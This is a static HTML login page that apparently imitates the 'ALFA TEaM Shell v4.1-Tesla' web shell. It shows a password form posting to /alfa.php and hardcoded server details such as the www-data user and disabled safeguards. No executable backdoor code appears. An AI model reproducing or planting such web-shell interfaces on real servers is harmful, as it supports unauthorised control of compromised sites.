<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="robots" content="noindex, nofollow, noarchive" />
<title>ALFA TEaM Shell v4.1-Tesla</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{
  background:#080a0c;
  background-image:
    radial-gradient(ellipse at 50% 0%,rgba(0,255,140,.06),transparent 60%),
    repeating-linear-gradient(0deg,rgba(255,255,255,.017) 0 1px,transparent 1px 3px);
  color:#c8d3cd;
  font-family:"DejaVu Sans Mono",Menlo,Consolas,"Courier New",monospace;
  font-size:13px;
  display:flex;
  align-items:center;
  justify-content:center;
  min-height:100%;
  padding:24px;
}
.shell{width:520px;max-width:100%}
.brand{text-align:center;margin-bottom:26px;line-height:1.15}
.brand pre{
  color:#00ff8c;
  font-size:11px;
  letter-spacing:0;
  text-shadow:0 0 10px rgba(0,255,140,.45);
  display:inline-block;
  text-align:left;
}
.ver{
  color:#8892a0;
  font-size:11px;
  margin-top:12px;
  letter-spacing:.22em;
  text-transform:uppercase;
}
.ver b{color:#00ff8c;font-weight:400}
.panel{
  border:1px solid #1c2a24;
  background:rgba(10,16,13,.85);
  box-shadow:0 0 0 1px rgba(0,255,140,.05),0 18px 50px rgba(0,0,0,.7);
  padding:26px 24px 22px;
}
.panel .lock{
  text-align:center;
  color:#5d6b64;
  font-size:11px;
  letter-spacing:.18em;
  text-transform:uppercase;
  margin-bottom:18px;
  padding-bottom:14px;
  border-bottom:1px dashed #1c2a24;
}
label{
  display:block;
  color:#6f7d75;
  font-size:11px;
  letter-spacing:.12em;
  text-transform:uppercase;
  margin-bottom:7px;
}
input[type=password]{
  width:100%;
  background:#05080a;
  border:1px solid #22322b;
  color:#00ff8c;
  font-family:inherit;
  font-size:15px;
  padding:11px 12px;
  outline:0;
  letter-spacing:.28em;
}
input[type=password]:focus{
  border-color:#00ff8c;
  box-shadow:0 0 0 1px rgba(0,255,140,.25),inset 0 0 22px rgba(0,255,140,.05);
}
button{
  width:100%;
  margin-top:14px;
  background:#0d1a14;
  border:1px solid #00ff8c;
  color:#00ff8c;
  font-family:inherit;
  font-size:12px;
  letter-spacing:.3em;
  text-transform:uppercase;
  padding:11px;
  cursor:pointer;
}
button:hover{background:#00ff8c;color:#05080a}
.sysinfo{
  margin-top:22px;
  border-top:1px dashed #1c2a24;
  padding-top:14px;
  font-size:11px;
  color:#4e5a53;
  line-height:1.85;
}
.sysinfo span{color:#7f8d85}
.sysinfo .ok{color:#00ff8c}
.sysinfo .no{color:#ff4d4d}
.foot{
  text-align:center;
  margin-top:20px;
  font-size:10px;
  color:#39433d;
  letter-spacing:.16em;
}
.cursor{
  display:inline-block;
  width:7px;
  height:13px;
  background:#00ff8c;
  vertical-align:-2px;
  animation:blink 1.05s steps(1) infinite;
}
@keyframes blink{0%,49%{opacity:1}50%,100%{opacity:0}}
</style>
</head>
<body>

<div class="shell">

  <div class="brand">
<pre>  _   _    ___    _
 /_\ | |  | __|  /_\
/ _ \| |__| _|  / _ \
\_/ \_\____|_| /_/ \_\</pre>
    <div class="ver">TEaM Shell &middot; <b>v4.1-Tesla</b></div>
  </div>

  <div class="panel">
    <div class="lock">&#9679; Authentication Required</div>

    <form method="post" action="/alfa.php" autocomplete="off">
      <label for="pass">Password</label>
      <input type="password" name="pass" id="pass" autocomplete="off" spellcheck="false" autofocus />
      <button type="submit">Enter</button>
    </form>

    <div class="sysinfo">
      <div><span>Server</span> &nbsp;: Linux web-01 5.15.0-91-generic x86_64</div>
      <div><span>Software</span>: Apache/2.4.52 (Ubuntu) PHP/7.4.33</div>
      <div><span>User</span> &nbsp; &nbsp;: www-data (33) &nbsp; <span>Group</span>: www-data (33)</div>
      <div><span>Safe Mode</span>: <span class="no">OFF</span> &nbsp; <span>Disabled</span>: <span class="ok">NONE</span></div>
      <div><span>Path</span> &nbsp; &nbsp;: /var/www/html<span class="cursor"></span></div>
    </div>
  </div>

  <div class="foot">ALFA TEaM 2026 &middot; ALL RIGHTS RESERVED</div>

</div>

</body>
</html>
